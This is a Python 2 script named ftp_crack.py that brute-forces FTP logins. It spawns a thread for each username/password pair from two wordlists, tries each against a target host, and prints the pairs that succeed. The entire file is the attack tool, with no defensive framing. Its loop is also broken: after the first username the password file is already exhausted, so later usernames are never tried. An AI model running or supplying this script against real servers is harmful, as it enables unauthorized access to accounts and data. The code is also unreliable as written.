#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Time   :  18-6-23 下午11:31
# Author :  xiaodong
# File   :  ftp_crack.py

import ftplib

import threading

import argparse

def ftpcrack(host,username,password):
    ftp = ftplib.FTP()
    try:
        ftp.connect(host,21,2)
        ftp.login(username,password)
        ftp.retrlines('LIST')
        ftp.quit()
        print "{} succeed username{} password {}".format(host,username,password)
        return True
    except ftplib.all_errors as e:
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host',help='please host  you want to crack ,eg:127.0.0.1')
    parser.add_argument('userlist',help='userlist eag:user.txt')
    parser.add_argument('passlist',help='passlist  eg:pass.txt')
    args = parser.parse_args()

    host = args.host

    userfile = args.userlist

    passfile = args.passlist

    userf = open(userfile,'r')
    passf = open(passfile,'r')
    for line in userf.readlines():
        username = line.strip()
        for line in passf.readlines():
            password = line.strip()
            t = threading.Thread(target=ftpcrack,args=(host,username,password))
            t.start()

if __name__=="__main__":
    main()

